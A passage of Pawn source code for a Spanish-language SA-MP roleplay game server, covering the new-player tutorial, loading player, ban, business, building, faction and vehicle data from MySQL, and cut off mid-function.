			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][0], "~w~En la ciudad de Malos Aires, hay una gran cantidad de empleos y roles disponibles. Como por ejemplo...");
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][1], "~b~~h~~h~ - oficial de policia");
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][2], "~b~~h~~h~ - paramedico");

			SetPVarInt(playerid, "tutTimer", SetTimerEx("tutorial", 15000, false, "ii", playerid, step + 1));
	    }
	    case 7: {
	        InterpolateCameraPos(playerid, 1211.487670, -1293.440307, 27.860240, 1892.619873, -1798.850219, 68.025955, 3000, CAMERA_CUT);
			InterpolateCameraLookAt(playerid, 1208.612304, -1295.868041, 26.504356, 1889.938354, -1801.596801, 66.900779, 3000, CAMERA_CUT);
			InterpolateCameraPos(playerid, 1892.619873, -1798.850219, 68.025955, 1830.553344, -1882.067016, 33.868297, 3000, 1);
			InterpolateCameraLookAt(playerid, 1889.938354, -1801.596801, 66.900779, 1827.444335, -1883.833740, 32.075828, 3000, 1);
			
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][0], "~w~En la ciudad de Malos Aires, hay una gran cantidad de empleos y roles disponibles. Como por ejemplo...");
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][1], "~b~~h~~h~ - oficial de policia");
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][2], "~b~~h~~h~ - paramedico");
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][3], "~b~~h~~h~ - taxista");

			SetPVarInt(playerid, "tutTimer", SetTimerEx("tutorial", 15000, false, "ii", playerid, step + 1));
	    }
	    case 8: {
	    	InterpolateCameraPos(playerid, 1830.553344, -1882.067016, 33.868297, 2217.920654, -2129.320312, 59.432971, 3000, CAMERA_CUT);
			InterpolateCameraLookAt(playerid, 1827.444335, -1883.833740, 32.075828, 2218.117675, -2133.008789, 57.897941, 3000, CAMERA_CUT);
			InterpolateCameraPos(playerid, 2217.920654, -2129.320312, 59.432971, 2246.860839, -2233.512207, 23.764274, 3000, 1);
			InterpolateCameraLookAt(playerid, 2218.117675, -2133.008789, 57.897941, 2243.064697, -2232.351562, 23.272230, 3000, 1);

			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][0], "~w~En la ciudad de Malos Aires, hay una gran cantidad de empleos y roles disponibles. Como por ejemplo...");
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][1], "~b~~h~~h~ - oficial de policia");
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][2], "~b~~h~~h~ - paramedico");
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][3], "~b~~h~~h~ - taxista");
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][4], "~b~~h~~h~ - camionero");

			SetPVarInt(playerid, "tutTimer", SetTimerEx("tutorial", 15000, false, "ii", playerid, step + 1));
	    }
	    case 9: {
	    	InterpolateCameraPos(playerid, 2246.860839, -2233.512207, 23.764274, 60.416469, -198.172134, 64.205131, 3000, CAMERA_CUT);
			InterpolateCameraLookAt(playerid, 2243.064697, -2232.351562, 23.272230, 58.964233, -194.497375, 63.582897, 3000, CAMERA_CUT);
	    	InterpolateCameraPos(playerid, 60.416469, -198.172134, 64.205131, -37.132026, 123.020172, 33.543777, 5000, 1);
			InterpolateCameraLookAt(playerid, 58.964233, -194.497375, 63.582897, -37.137905, 119.544448, 31.564058, 5000, 1);
			
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][0], "~w~En la ciudad de Malos Aires, hay una gran cantidad de empleos y roles disponibles. Como por ejemplo...");
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][1], "~b~~h~~h~ - oficial de policia");
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][2], "~b~~h~~h~ - paramedico");
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][3], "~b~~h~~h~ - taxista");
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][4], "~b~~h~~h~ - camionero");
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][5], "~b~~h~~h~ - granjero");

			SetPVarInt(playerid, "tutTimer", SetTimerEx("tutorial", 15000, false, "ii", playerid, step + 1));
	    }
	    case 10: {
	    	SetPlayerCameraPos(playerid, 1466.869506, -1575.771972, 109.123466);
			SetPlayerCameraLookAt(playerid, 1470.403442, -1574.002441, 109.740196);
			InterpolateCameraPos(playerid, 1466.869506, -1575.771972, 109.123466, 1481.400268, -1576.889038, 90.823272, 3000, 1);
			InterpolateCameraLookAt(playerid, 1470.403442, -1574.002441, 109.740196, 1481.267700, -1580.246704, 88.653373, 3000, 1);
			
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][0], "~w~En la ciudad de Malos Aires, hay una gran cantidad de empleos y roles disponibles. Como por ejemplo...");
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][1], "~b~~h~~h~ - oficial de policia");
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][2], "~b~~h~~h~ - paramedico");
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][3], "~b~~h~~h~ - taxista");
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][4], "~b~~h~~h~ - camionero");
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][5], "~b~~h~~h~ - granjero");
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][6], "~b~~h~~h~ - entre muchos otros...");
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][7], "~w~Pero tambien puedes crear los tuyos contratando a otras personas o trabajando para ellas.");
			
			SetPVarInt(playerid, "tutTimer", SetTimerEx("tutorial", 15000, false, "ii", playerid, step + 1));
	    }
	    case 11: {
			for(new i = 0; i < 7; i++) {
			    PlayerTextDrawHide(playerid, TutTD_Text[playerid][i]);
			}
			TextDrawHideForPlayer(playerid, TutTDBackground);
	        ShowPlayerDialog(playerid, DLG_TUT1, DIALOG_STYLE_LIST, "Escoge una forma v�lida para averiguar el nombre de un personaje", "Le pregunto por un canal IC\nLe pregunto discretamente por un canal OOC\nLe pregunto por facebook\nLe pregunto roleramente por /b\nLe robo la billetera", "Siguiente", "");
		}
	}
	return 1;
}

forward OnPlayerDataLoad(playerid);
public OnPlayerDataLoad(playerid)
{
   	new query[128],
		result[128],
		rows,
		fields;

	cache_get_data(rows, fields);

	if(rows)
	{
		DeletePVar(playerid, "LoginAttempts");


        cache_get_field_content(0, "Id", result); 				PlayerInfo[playerid][pID] 				= strval(result);
    	cache_get_field_content(0, "Level", result); 			PlayerInfo[playerid][pLevel] 			= strval(result);
		cache_get_field_content(0, "AdminLevel", result); 		PlayerInfo[playerid][pAdmin] 			= strval(result);
		cache_get_field_content(0, "AccountBlocked", result); 	PlayerInfo[playerid][pAccountBlocked] 	= strval(result);
		cache_get_field_content(0, "pRegStep", result); 		PlayerInfo[playerid][pRegStep] 			= strval(result);
		cache_get_field_content(0, "Tutorial", result); 		PlayerInfo[playerid][pTutorial] 		= strval(result);
		cache_get_field_content(0, "Sex", result); 				PlayerInfo[playerid][pSex] 				= strval(result);
		cache_get_field_content(0, "Age", result); 				PlayerInfo[playerid][pAge] 				= strval(result);
		cache_get_field_content(0, "Exp", result); 				PlayerInfo[playerid][pExp] 				= strval(result);
		cache_get_field_content(0, "CashMoney", result); 		PlayerInfo[playerid][pCash] 			= strval(result);
		cache_get_field_content(0, "BankMoney", result); 		PlayerInfo[playerid][pBank] 			= strval(result);
		cache_get_field_content(0, "Skin", result); 			PlayerInfo[playerid][pSkin] 			= strval(result);
  		cache_get_field_content(0, "pThirst", result); 			PlayerInfo[playerid][pThirst] 			= strval(result);
		cache_get_field_content(0, "pHunger", result); 			PlayerInfo[playerid][pHunger]			= strval(result);
		cache_get_field_content(0, "Job", result); 				PlayerInfo[playerid][pJob] 				= strval(result);
		cache_get_field_content(0, "JobTime", result); 			PlayerInfo[playerid][pJobTime] 			= strval(result);
		cache_get_field_content(0, "pJobAllowed", result); 		PlayerInfo[playerid][pJobAllowed] 		= strval(result);
		cache_get_field_content(0, "PlayingHours", result); 	PlayerInfo[playerid][pPlayingHours] 	= strval(result);
		cache_get_field_content(0, "PayCheck", result); 		PlayerInfo[playerid][pPayCheck]			= strval(result);
		cache_get_field_content(0, "pPayTime", result);         SetPVarInt(playerid, "pPayTime", strval(result));
		cache_get_field_content(0, "Faction", result); 			PlayerInfo[playerid][pFaction] 			= strval(result);
		cache_get_field_content(0, "Rank", result); 			PlayerInfo[playerid][pRank] 			= strval(result);
		cache_get_field_content(0, "HouseKey", result); 		PlayerInfo[playerid][pHouseKey] 		= strval(result);
		cache_get_field_content(0, "BizKey", result); 			PlayerInfo[playerid][pBizKey] 			= strval(result);
		cache_get_field_content(0, "Warnings", result); 		PlayerInfo[playerid][pWarnings] 		= strval(result);
		cache_get_field_content(0, "CarLic", result); 			PlayerInfo[playerid][pCarLic] 			= strval(result);
		cache_get_field_content(0, "FlyLic", result); 			PlayerInfo[playerid][pFlyLic] 			= strval(result);
		cache_get_field_content(0, "WepLic", result); 			PlayerInfo[playerid][pWepLic] 			= strval(result);
		cache_get_field_content(0, "PhoneNumber", result); 		PlayerInfo[playerid][pPhoneNumber] 		= strval(result);
		cache_get_field_content(0, "PhoneCompany", result); 	PlayerInfo[playerid][pPhoneC] 			= strval(result);
		cache_get_field_content(0, "ListNumber", result);		PlayerInfo[playerid][pListNumber] 		= strval(result);
		cache_get_field_content(0, "Jailed", result); 			PlayerInfo[playerid][pJailed]			= strval(result);
		cache_get_field_content(0, "JailedTime", result); 		PlayerInfo[playerid][pJailTime] 		= strval(result);
		cache_get_field_content(0, "pInterior", result);		PlayerInfo[playerid][pInterior] 		= strval(result);
		cache_get_field_content(0, "pWorld", result); 			PlayerInfo[playerid][pVirtualWorld] 	= strval(result);
		cache_get_field_content(0, "pHospitalized", result); 	PlayerInfo[playerid][pHospitalized] 	= strval(result);
		cache_get_field_content(0, "pWantedLevel", result); 	PlayerInfo[playerid][pWantedLevel] 		= strval(result);
		cache_get_field_content(0, "pCantWork", result); 		PlayerInfo[playerid][pCantWork]			= strval(result);
		cache_get_field_content(0, "pJobLimitCounter", result); SetPVarInt(playerid, "pJobLimitCounter", strval(result));
		cache_get_field_content(0, "pMuteB", result); 			PlayerInfo[playerid][pMuteB] 			= strval(result);
		cache_get_field_content(0, "pRentCarID", result); 		PlayerInfo[playerid][pRentCarID] 		= strval(result);
		cache_get_field_content(0, "pRentCarRID", result); 		PlayerInfo[playerid][pRentCarRID] 		= strval(result);
		cache_get_field_content(0, "pMarijuana", result); 		PlayerInfo[playerid][pMarijuana] 		= strval(result);
		cache_get_field_content(0, "pLSD", result); 			PlayerInfo[playerid][pLSD] 				= strval(result);
		cache_get_field_content(0, "pEcstasy", result); 			PlayerInfo[playerid][pEcstasy] 			= strval(result);
		cache_get_field_content(0, "pCocaine", result); 		PlayerInfo[playerid][pCocaine] 			= strval(result);
		cache_get_field_content(0, "pCigarettes", result); 		PlayerInfo[playerid][pCigarettes] 		= strval(result);
		cache_get_field_content(0, "pLighter", result); 		PlayerInfo[playerid][pLighter] 			= strval(result);
		cache_get_field_content(0, "pRadio", result); 			PlayerInfo[playerid][pRadio] 			= strval(result);
    	cache_get_field_content(0, "pMask", result); 			PlayerInfo[playerid][pMask] 			= strval(result);
		cache_get_field_content(0, "pFightStyle", result); 		PlayerInfo[playerid][pFightStyle] 		= strval(result);
        cache_get_field_content(0, "pAdictionAbstinence", result); 		PlayerInfo[playerid][pAdictionAbstinence] 		= strval(result);
		
		cache_get_field_content(0, "Name", 						PlayerInfo[playerid][pName],1,MAX_PLAYER_NAME);
		cache_get_field_content(0, "LastConnected", 			PlayerInfo[playerid][pLastConnected],1,25);
		cache_get_field_content(0, "pAccusedOf", 				PlayerInfo[playerid][pAccusedOf],1,64);
		cache_get_field_content(0, "pAccusedBy", 				PlayerInfo[playerid][pAccusedBy],1,24);

		cache_get_field_content(0, "pX", result); 				PlayerInfo[playerid][pX] 				= floatstr(result);
		cache_get_field_content(0, "pY", result); 				PlayerInfo[playerid][pY] 				= floatstr(result);
		cache_get_field_content(0, "pZ", result); 				PlayerInfo[playerid][pZ] 				= floatstr(result);
		cache_get_field_content(0, "pA", result);				PlayerInfo[playerid][pA] 				= floatstr(result);
		cache_get_field_content(0, "pHealth", result); 			PlayerInfo[playerid][pHealth] 			= floatstr(result);
		cache_get_field_content(0, "pArmour", result); 			PlayerInfo[playerid][pArmour] 			= floatstr(result);
 		cache_get_field_content(0, "pAdictionPercent", result); 	PlayerInfo[playerid][pAdictionPercent] 			= floatstr(result);
 		
 		cache_get_field_content(0, "pTakeInputs", result); 			PlayerInfo[playerid][pTakeInputs] 			= strval(result);
 		
 		cache_get_field_content(0, "HouseKeyIncome", result); 		PlayerInfo[playerid][pHouseKeyIncome] 		= strval(result);

        gPlayerLogged[playerid] = 1;

        loadThiefJobData(playerid,PlayerInfo[playerid][pID]); // Info del job de ladr�n
		loadPlayerCarKeys(playerid); // Llavero del usuario
		LoadInvInfo(playerid); // Info de su inventario
		LoadHandsInfo(playerid); // Info de lo que tiene en las manos
		LoadToysInfo(playerid); // Toys
		LoadBackInfo(playerid); // Info de espalda
		LoadNotebookContacts(playerid); // Carga la agenda del jugador
		
       	CreatePlayerBasicNeeds(playerid);
       	
       	if(PlayerInfo[playerid][pFaction] != 0)
       	{
       		if(FactionInfo[PlayerInfo[playerid][pFaction]][fType] == FAC_TYPE_GANG)
       		    ShowGangZonesToPlayer(playerid);
		}

		GetPlayerIp(playerid, PlayerInfo[playerid][pIP], 16);

	    format(query, sizeof(query),"SELECT * FROM `bans` WHERE (pID = %d OR pIP = '%s') AND banActive = 1", PlayerInfo[playerid][pID], PlayerInfo[playerid][pIP]);
		mysql_function_query(dbHandle, query, true, "OnBanDataLoad", "i", playerid);

        CreateMissionEventTimer(playerid);
        
        // Seteamos el dinero del jugador.
        SetPlayerCash(playerid,PlayerInfo[playerid][pCash]);
        SetPlayerWantedLevelEx(playerid, PlayerInfo[playerid][pWantedLevel]);
        
		// Cuenta bloqueada.
		if(PlayerInfo[playerid][pAccountBlocked] == 1)
		{
			SendClientMessage(playerid,COLOR_LIGHTYELLOW2,"{878EE7}[INFO]:{C8C8C8} personaje bloqueado, los administradores est�n analizando tu cuenta.");
			Kick(playerid);
		}

		if(!PlayerInfo[playerid][pTutorial])
		{
			TogglePlayerSpectating(playerid, true);
      		SetPVarInt(playerid, "tutTimer", SetTimerEx("tutorial", 200, false, "ii", playerid, 1));
		    SetPlayerHealthEx(playerid, 100.00);
		    PlayerInfo[playerid][pArmour] = 0.0;
		}
		else if(PlayerInfo[playerid][pRegStep] > 0)
		{
			TextDrawShowForPlayer(playerid, RegTDBorder1);
			TextDrawShowForPlayer(playerid, RegTDBorder2);
			TextDrawShowForPlayer(playerid, RegTDTitle);
			TextDrawShowForPlayer(playerid, RegTDBackground);
			PlayerTextDrawShow(playerid, RegTDGender[playerid]);
			PlayerTextDrawShow(playerid, RegTDSkin[playerid]);
			PlayerTextDrawShow(playerid, RegTDAge[playerid]);
			PlayerTextDrawShow(playerid, RegTDOrigin[playerid]);

			PlayerInfo[playerid][pSex] = 1;
			PlayerInfo[playerid][pSkin] = SkinRegMale[0][0];
			PlayerInfo[playerid][pRegStep] = 1;

			SetPlayerInterior(playerid, 14);
	     	SetPlayerVirtualWorld(playerid, random(100000) + 44000);

			SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "Presiona ~k~~PED_SPRINT~ para seleccionar una opci�n, ~k~~VEHICLE_ENTER_EXIT~ para finalizar.");
			SetSpawnInfo(playerid, 0, SkinRegMale[0][0], -1828.2881, -30.3119, 1061.1436, 182.0051, 0, 0, 0, 0, 0, 0);
			//TogglePlayerSpectating(playerid, false);
			return 1;
		}

		SetPlayerArmour(playerid, PlayerInfo[playerid][pArmour]);
		
		SetSpawnInfo(playerid, 0, PlayerInfo[playerid][pSkin], PlayerInfo[playerid][pX], PlayerInfo[playerid][pY], PlayerInfo[playerid][pZ], PlayerInfo[playerid][pA], 0, 0, 0, 0, 0, 0);
		if(PlayerInfo[playerid][pTutorial] == 1 && PlayerInfo[playerid][pRegStep] == 0)
		{

			if(PlayerInfo[playerid][pAdmin] > 0)
			    SendClientMessage(playerid, COLOR_YELLOW2, "{878EE7}[INFO]:{C8C8C8} bienvenido, para ver los comandos de administraci�n escribe /acmds.");
			else
			    SendClientMessage(playerid, COLOR_YELLOW2, "{878EE7}[INFO]:{C8C8C8} bienvenido, para ver los comandos escribe /ayuda.");
			
			if(PlayerInfo[playerid][pRentCarID] > 0)
			{
			    if(RentCarInfo[PlayerInfo[playerid][pRentCarRID]][rRented] == 1 && RentCarInfo[PlayerInfo[playerid][pRentCarRID]][rOwnerSQLID] == PlayerInfo[playerid][pID])
			        SendFMessage(playerid, COLOR_WHITE, "Te quedan %d minutos de renta del veh�culo que alquilaste.", RentCarInfo[PlayerInfo[playerid][pRentCarRID]][rTime]);
				else
			    {
			    	PlayerInfo[playerid][pRentCarRID] = 0;
			    	PlayerInfo[playerid][pRentCarID] = 0;
			    	SendClientMessage(playerid, COLOR_WHITE, "Se ha acabado el tiempo de renta de tu veh�culo alquilado.");
				}
			}

			PrintHouseRentAdvise(playerid);
			
			SendClientMessage(playerid, COLOR_YELLOW2, " ");
			SpawnPlayer(playerid);
		}
	}
	else
	{
	    SetPVarInt(playerid, "LoginAttempts", GetPVarInt(playerid, "LoginAttempts") + 1);
	    if(GetPVarInt(playerid, "LoginAttempts") > MAX_LOGIN_ATTEMPTS)
		{
	        KickPlayer(playerid,"el sistema","demasiados intentos de iniciar sesi�n");
	        return 1;
	    }
		else
			ShowPlayerDialog(playerid, DLG_LOGIN, DIALOG_STYLE_PASSWORD, "�Contrase�a incorrecta!","Ingresa tu contrase�a a continuaci�n:","Ingresar","");
	}
	return 1;
}

forward OnBanDataLoad(playerid);
public OnBanDataLoad(playerid)
{
   	new issuerName[MAX_PLAYER_NAME],
   	    banReason[128],
		rows,
		fields;

	cache_get_data(rows, fields);

	if(rows)
	{
		cache_get_field_content(0, "banIssuerName", issuerName, 1, MAX_PLAYER_NAME);
	    cache_get_field_content(0, "banReason", banReason, 1, 128);
	    ClearScreen(playerid);
	    SendFMessage(playerid, COLOR_ADMINCMD, "Te encuentras baneado/a por %s, raz�n: %s", issuerName, banReason);
	    SendClientMessage(playerid, COLOR_WHITE, "Para m�s informaci�n pasa por nuestros foros en www.malosaires.com.ar");
		SetTimerEx("kickTimer", 1000, false, "d", playerid);
	}
	return 1;
}

forward OnUnbanDataLoad(playerid, type, target[32]);
public OnUnbanDataLoad(playerid, type, target[32]) {
	new rows;
	new fields;
	new string[128];
	new query[128];
	
    cache_get_data(rows, fields);

	if (type == 0) {
	    if (rows) {
			format(string, sizeof(string), "[Staff] el administrador %s ha removido el BAN a '%s'.", GetPlayerNameEx(playerid), target);

			format(query, sizeof(query), "UPDATE `bans` SET `banActive` = '0' WHERE `pName` = '%s'", target);
		} else {
		    SendFMessage(playerid, COLOR_YELLOW2, "No se ha encontrado ning�n ban ACTIVO relacionado con el nombre '%s' en la base de datos.", target);
		    return 1;
		}
	} else if (type == 1) {
		if (rows) {
			format(string, sizeof(string), "[Staff] el administrador %s ha removido el BAN a todas las cuentas con la IP '%s'.", GetPlayerNameEx(playerid), target);

			format(query, sizeof(query), "UPDATE `bans` SET `banActive` = '0' WHERE `pIP` = '%s'", target);
		} else {
		    SendFMessage(playerid, COLOR_YELLOW2, "No se ha encontrado ning�n ban ACTIVO relacionado con la IP '%s' en la base de datos.", target);
		    return 1;
		}
	}
	mysql_function_query(dbHandle, query, false, "", "");
    AdministratorMessage(COLOR_ADMINCMD, string, 1);
	return 1;
}

AntiDeAMX() {
    new b;
    #emit load.pri b
    #emit stor.pri b
}

forward OnBusinessDataLoad(id);
public OnBusinessDataLoad(id) {
   	new
		result[128],
		rows,
		fields;

	cache_get_data(rows, fields);

    if(rows) {
        Business[id][bInsideWorld] = id + 17000;
		cache_get_field_content(0, "bOwnerID", result); 			Business[id][bOwnerSQLID] 		= strval(result);
		cache_get_field_content(0, "bEnterable", result); 			Business[id][bEnterable] 		= strval(result);
		cache_get_field_content(0, "bOutsideInt", result); 			Business[id][bOutsideInt] 		= strval(result);
		cache_get_field_content(0, "bInsideInt", result); 			Business[id][bInsideInt] 		= strval(result);
		cache_get_field_content(0, "bPrice", result); 				Business[id][bPrice] 			= strval(result);
		cache_get_field_content(0, "bEntranceCost", result); 		Business[id][bEntranceFee] 		= strval(result);
		cache_get_field_content(0, "bTill", result); 				Business[id][bTill] 			= strval(result);
		cache_get_field_content(0, "bLocked", result); 				Business[id][bLocked] 			= strval(result);
		cache_get_field_content(0, "bType", result); 				Business[id][bType] 			= strval(result);
		cache_get_field_content(0, "bProducts", result); 			Business[id][bProducts] 		= strval(result);

		cache_get_field_content(0, "bOwnerName", 					Business[id][bOwner],1,MAX_PLAYER_NAME);
        cache_get_field_content(0, "bName", 						Business[id][bName],1,128);

		cache_get_field_content(0, "bOutsideX", result);	 		Business[id][bOutsideX] 		= floatstr(result);
		cache_get_field_content(0, "bOutsideY", result); 			Business[id][bOutsideY] 		= floatstr(result);
		cache_get_field_content(0, "bOutsideZ", result); 			Business[id][bOutsideZ] 		= floatstr(result);
		cache_get_field_content(0, "bOutsideAngle", result); 		Business[id][bOutsideAngle] 	= floatstr(result);
		cache_get_field_content(0, "bInsideX", result); 			Business[id][bInsideX] 			= floatstr(result);
		cache_get_field_content(0, "bInsideY", result); 			Business[id][bInsideY] 			= floatstr(result);
		cache_get_field_content(0, "bInsideZ", result); 			Business[id][bInsideZ] 			= floatstr(result);
		cache_get_field_content(0, "bInsideAngle", result); 		Business[id][bInsideAngle] 		= floatstr(result);
		Business[id][bLoaded] = true;
	} else {
	    Business[id][bLoaded] = false;
	}
	ReloadBizIcon(id);
	openBizPermission[id] = true;
	return 1;
}

forward OnBuildingDataLoad(id);
public OnBuildingDataLoad(id) {
   	new
		result[128],
		rows,
		fields;

	cache_get_data(rows, fields);

    if(rows) {
		cache_get_field_content(0, "blEntranceFee", result); 		Building[id][blEntranceFee] 		= strval(result);
		cache_get_field_content(0, "blOutsideInt", result); 		Building[id][blOutsideInt] 			= strval(result);
		cache_get_field_content(0, "blInsideInt", result); 			Building[id][blInsideInt] 			= strval(result);
		cache_get_field_content(0, "blLocked", result); 			Building[id][blLocked] 				= strval(result);
  		cache_get_field_content(0, "blPickupModel", result); 		Building[id][blPickupModel] 		= strval(result);
  		
  		cache_get_field_content(0, "blFaction", result); 			Building[id][blFaction] 			= strval(result);
		cache_get_field_content(0, "blInsideWorld", result); 		Building[id][blInsideWorld] 		= strval(result);

		cache_get_field_content(0, "blText", 						Building[id][blText],1,128);
		cache_get_field_content(0, "blText2", 						Building[id][blText2],1,128);

		cache_get_field_content(0, "blOutsideX", result); 			Building[id][blOutsideX] 			= floatstr(result);
		cache_get_field_content(0, "blOutsideY", result); 			Building[id][blOutsideY] 			= floatstr(result);
		cache_get_field_content(0, "blOutsideZ", result); 			Building[id][blOutsideZ] 			= floatstr(result);
		cache_get_field_content(0, "blOutsideAngle", result); 		Building[id][blOutsideAngle] 		= floatstr(result);
		cache_get_field_content(0, "blInsideX", result); 			Building[id][blInsideX] 			= floatstr(result);
		cache_get_field_content(0, "blInsideY", result);			Building[id][blInsideY] 			= floatstr(result);
		cache_get_field_content(0, "blInsideZ", result);			Building[id][blInsideZ] 			= floatstr(result);
		cache_get_field_content(0, "blInsideAngle", result);		Building[id][blInsideAngle] 		= floatstr(result);
        Building[id][blLoaded] = true;
	} else {
	    Building[id][blLoaded] = false;
	}
	ReloadBlIcon(id);
	return 1;
}

forward OnServerDataLoad();
public OnServerDataLoad() {
    new
		result[128],
		rows,
		fields;
	cache_get_data(rows, fields);

    if(rows) {
	    cache_get_field_content(0, "sVehiclePricePercent", result); ServerInfo[sVehiclePricePercent] = strval(result);
	    cache_get_field_content(0, "sPlayersRecord", result); ServerInfo[sPlayersRecord] = strval(result);
	    cache_get_field_content(0, "svLevelExp", result); ServerInfo[svLevelExp] = strval(result);
	    cache_get_field_content(0, "sDrugRawMats", result); ServerInfo[sDrugRawMats] = strval(result);
	}
	return 1;
}

forward OnFactionDataLoad(id);
public OnFactionDataLoad(id) {
    new
		result[128],
		rows,
		fields;

	cache_get_data(rows, fields);

    if(rows) {
		cache_get_field_content(0, "Type", result); 					FactionInfo[id][fType] 		= strval(result);
		cache_get_field_content(0, "Materials", result);				FactionInfo[id][fMaterials] = strval(result);
		cache_get_field_content(0, "Bank", result); 					FactionInfo[id][fBank] 		= strval(result);
		cache_get_field_content(0, "AllowJob", result); 				FactionInfo[id][fAllowJob] 	= strval(result);
		cache_get_field_content(0, "fMissionVeh", result); 				FactionInfo[id][fMissionVeh]= strval(result);
		cache_get_field_content(0, "JoinRank", result); 				FactionInfo[id][fJoinRank] 	= strval(result);
		cache_get_field_content(0, "RankAmount", result); 				FactionInfo[id][fRankAmount]= strval(result);
		cache_get_field_content(0, "Name",								FactionInfo[id][fName],1,50);
		cache_get_field_content(0, "Rank1", 							FactionInfo[id][fRank1],1,35);
		cache_get_field_content(0, "Rank2", 							FactionInfo[id][fRank2],1,35);
		cache_get_field_content(0, "Rank3", 							FactionInfo[id][fRank3],1,35);
		cache_get_field_content(0, "Rank4", 							FactionInfo[id][fRank4],1,35);
		cache_get_field_content(0, "Rank5", 							FactionInfo[id][fRank5],1,35);
		cache_get_field_content(0, "Rank6", 							FactionInfo[id][fRank6],1,35);
		cache_get_field_content(0, "Rank7", 							FactionInfo[id][fRank7],1,35);
		cache_get_field_content(0, "Rank8", 							FactionInfo[id][fRank8],1,35);
		cache_get_field_content(0, "Rank9", 							FactionInfo[id][fRank9],1,35);
		cache_get_field_content(0, "Rank10", 							FactionInfo[id][fRank10],1,35);
	}
	return 1;
}

forward OnVehicleDataLoad(id);
public OnVehicleDataLoad(id) {
   	new
		result[128],
		rows,
		fields;

	cache_get_data(rows, fields);

    if(rows) {
	    cache_get_field_content(0, "VehSQLID", result); 				VehicleInfo[id][VehSQLID] 		= strval(result);
		cache_get_field_content(0, "VehModel", result); 				VehicleInfo[id][VehModel] 		= strval(result);
		cache_get_field_content(0, "VehColor1", result); 				VehicleInfo[id][VehColor1] 		= strval(result);
		cache_get_field_content(0, "VehColor2", result); 				VehicleInfo[id][VehColor2] 		= strval(result);
		cache_get_field_content(0, "VehFaction", result); 				VehicleInfo[id][VehFaction] 	= strval(result);
		cache_get_field_content(0, "VehJob", result); 					VehicleInfo[id][VehJob] 		= strval(result);
		cache_get_field_content(0, "VehDamage1", result); 				VehicleInfo[id][VehDamage1] 	= strval(result);
		cache_get_field_content(0, "VehDamage2", result); 				VehicleInfo[id][VehDamage2] 	= strval(result);
		cache_get_field_content(0, "VehDamage3", result); 				VehicleInfo[id][VehDamage3] 	= strval(result);
		cache_get_field_content(0, "VehDamage4", result); 				VehicleInfo[id][VehDamage4]	 	= strval(result);
		cache_get_field_content(0, "VehFuel", result); 					VehicleInfo[id][VehFuel] 		= strval(result);
		cache_get_field_content(0, "VehType", result); 					VehicleInfo[id][VehType] 		= strval(result);
		cache_get_field_content(0, "VehOwnerID", result); 				VehicleInfo[id][VehOwnerSQLID] 	= strval(result);
		cache_get_field_content(0, "VehLocked", result);	 			VehicleInfo[id][VehLocked] 		= strval(result);
		cache_get_field_content(0, "VehLights", result); 				VehicleInfo[id][VehLights] 		= strval(result);
		cache_get_field_content(0, "VehEngine", result); 				VehicleInfo[id][VehEngine] 		= strval(result);
		cache_get_field_content(0, "VehBonnet", result); 				VehicleInfo[id][VehBonnet] 		= strval(result);
		cache_get_field_content(0, "VehBoot", result); 					VehicleInfo[id][VehBoot] 		= strval(result);
		cache_get_field_content(0, "VehMarijuana", result); 			VehicleInfo[id][VehMarijuana] 	= strval(result);
		cache_get_field_content(0, "VehLSD", result); 					VehicleInfo[id][VehLSD] 		= strval(result);
		cache_get_field_content(0, "VehEcstasy", result); 				VehicleInfo[id][VehEcstasy] 		= strval(result);
		cache_get_field_content(0, "VehCocaine", result); 				VehicleInfo[id][VehCocaine] 	= strval(result);
		cache_get_field_content(0, "VehPosX", result); 					VehicleInfo[id][VehPosX] 		= floatstr(result);
		cache_get_field_content(0, "VehPosY", result); 					VehicleInfo[id][VehPosY] 		= floatstr(result);
		cache_get_field_content(0, "VehPosZ", result); 					VehicleInfo[id][VehPosZ] 		= floatstr(result);
	 	cache_get_field_content(0, "VehAngle", result); 				VehicleInfo[id][VehAngle] 		= floatstr(result);
	 	cache_get_field_content(0, "VehHP", result); 					VehicleInfo[id][VehHP] 			= floatstr(result);
		cache_get_field_content(0, "VehPlate",							VehicleInfo[id][VehPlate],1,32);
		cache_get_field_content(0, "VehOwnerName",						VehicleInfo[id][VehOwnerName],1,MAX_PLAYER_NAME);
		
		if(VehicleInfo[id][VehType] == VEH_OWNED) {
		    cache_get_field_content(0, "VehCompSlot0", result); 		VehicleInfo[id][VehCompSlot][0] = strval(result);
		    cache_get_field_content(0, "VehCompSlot1", result); 		VehicleInfo[id][VehCompSlot][1] = strval(result);
		    cache_get_field_content(0, "VehCompSlot2", result); 		VehicleInfo[id][VehCompSlot][2] = strval(result);
		    cache_get_field_content(0, "VehCompSlot3", result); 		VehicleInfo[id][VehCompSlot][3] = strval(result);
		    cache_get_field_content(0, "VehCompSlot4", result); 		VehicleInfo[id][VehCompSlot][4] = strval(result);
		    cache_get_field_content(0, "VehCompSlot5", result); 		VehicleInfo[id][VehCompSlot][5] = strval(result);
		    cache_get_field_content(0, "VehCompSlot6", result); 		VehicleInfo[id][VehCompSlot][6] = strval(result);
		    cache_get_field_content(0, "VehCompSlot7", result); 		VehicleInfo[id][VehCompSlot][7] = strval(result);
